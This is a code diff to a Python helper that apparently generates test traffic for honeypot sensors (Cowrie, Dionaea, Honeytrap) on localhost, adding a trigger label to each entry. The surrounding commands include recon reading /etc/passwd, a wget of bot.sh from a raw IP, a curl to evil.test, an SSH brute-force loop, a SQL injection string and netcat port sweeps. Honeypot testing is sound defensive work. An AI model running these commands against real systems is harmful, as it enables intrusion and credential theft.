@@ -112,6 +112,7 @@ def _generators() -> List[Dict[str, str]]:
                 f"whoami; id; uname -a; cat /etc/passwd; ps aux; "
                 f"wget http://185.99.1.7/bot.sh; curl http://evil.test/x; ls -la /tmp; exit"
             ),
+            "trigger": "ssh_session",
         },
         {
             "target": f"Cowrie SSH :{h['ssh']} — 10 brute-force login attempts (no prompt)",
@@ -120,10 +121,12 @@ def _generators() -> List[Dict[str, str]]:
                 f"ssh -p {h['ssh']} -o BatchMode=yes -o StrictHostKeyChecking=no "
                 f"-o UserKnownHostsFile=/dev/null -o ConnectTimeout=4 $u@localhost true 2>/dev/null; done"
             ),
+            "trigger": "ssh_bruteforce",
         },
         {
             "target": f"Cowrie Telnet :{h['telnet']}",
             "cmd": f"nc localhost {h['telnet']}    # or: telnet localhost {h['telnet']}",
+            "trigger": "telnet",
         },
         {
             "target": f"Dionaea — SMB :{h['smb']} / FTP :{h['ftp']} / MSSQL :{h['mssql']}",
@@ -132,6 +135,7 @@ def _generators() -> List[Dict[str, str]]:
                 f"curl -s -m3 ftp://localhost:{h['ftp']}/ ; "
                 f"nc -w1 -z localhost {h['mssql']}"
             ),
+            "trigger": "dionaea",
         },
         {
             "target": f"Honeytrap :{h['ht1']}-{h['ht2']} — HTTP + SQLi-looking request",
@@ -140,6 +144,7 @@ def _generators() -> List[Dict[str, str]]:
                 f"curl -s \"http://localhost:{h['ht2']}/?id=1' OR '1'='1\" ; "
                 f"nc -w1 -z localhost {h['ht2']}"
             ),
+            "trigger": "honeytrap",
         },
         {
             "target": "Full port sweep (one line, all sensors)",
@@ -147,6 +152,7 @@ def _generators() -> List[Dict[str, str]]:
                 "for p in %s; do nc -w1 -vz localhost $p 2>&1; done"
                 % " ".join([h["ssh"], h["telnet"], h["smb"], h["ftp"], h["mssql"], h["ht1"], h["ht2"]])
             ),
+            "trigger": "port_sweep",
         },
     ]
 
